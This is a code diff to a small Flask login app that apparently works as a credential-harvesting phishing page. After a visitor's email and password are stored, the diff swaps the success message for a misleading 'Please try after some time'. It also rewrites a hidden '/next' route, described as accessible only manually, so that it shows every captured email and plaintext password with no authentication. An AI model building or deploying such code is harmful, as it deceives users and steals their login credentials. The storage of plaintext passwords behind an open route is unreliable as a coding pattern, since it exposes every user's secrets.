@@ -43,28 +43,26 @@ def login():
     conn.close()
 
     # Flash a success message
-    flash('Login successful!')
+    flash('Please try after some time')
     
     # Reload the index page after login
     return redirect(url_for('index'))
 
 # Route to display the last entered data (only accessible manually)
+# Route to display all user data in a table
 @app.route('/next')
 def next_page():
     conn = sqlite3.connect('users.db')
     c = conn.cursor()
 
-    # Retrieve the last inserted user's data
-    c.execute('SELECT email, password FROM users ORDER BY id DESC LIMIT 1')
-    user = c.fetchone()
+    # Retrieve all users from the database
+    c.execute('SELECT id, email, password FROM users')
+    users = c.fetchall()  # Fetch all user records
 
     conn.close()
 
-    if user:
-        email, password = user
-        return render_template('next.html', email=email, password=password)
-    else:
-        return "No user data found", 404
+    # Pass the user data to the template for rendering
+    return render_template('next.html', users=[{'id': user[0], 'email': user[1], 'password': user[2]} for user in users])
 
 if __name__ == '__main__':
     # Initialize the database
